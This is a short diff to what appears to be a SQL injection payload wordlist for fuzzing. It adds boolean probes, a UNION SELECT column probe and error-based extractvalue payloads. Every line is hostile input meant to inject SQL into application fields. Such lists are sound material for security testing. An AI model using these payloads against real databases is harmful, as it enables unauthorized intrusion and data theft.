@@ -25,7 +25,7 @@
 ' AND id IS NULL; --
 '''''''''''''UNION SELECT '2
 %00
-/*…*/
+/*...*/
 0|()-- 
 0'|()-- 
 0"|()-- 
@@ -36,3 +36,13 @@
 0'))|()-- 
 0"))|()-- 
 0)))|()-- 
+AND 1
+AND 0
+AND true
+AND false
+1-false
+1-true
+-2
+-1' UNION SELECT 1,2,3--+
+' or extractvalue(rand(),1);-- 
+' or extractvalue(rand(),1);--+
